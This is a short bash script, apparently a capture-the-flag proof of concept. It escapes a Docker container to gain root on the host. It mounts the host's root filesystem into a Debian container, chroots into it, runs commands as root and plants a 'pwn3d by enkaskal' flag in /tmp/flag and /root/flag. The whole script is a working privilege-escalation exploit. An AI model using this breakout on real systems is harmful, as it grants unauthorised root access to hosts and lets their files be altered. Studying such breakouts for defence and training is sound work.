#!/bin/bash

echo "before:"
ps aux
# now breakout and plant the flag on the host
docker run -v /:/host debian:latest /bin/bash -c "chroot /host su - root -c 'ps aux && echo pwn3d by enkaskal | tee /tmp/flag /root/flag'"
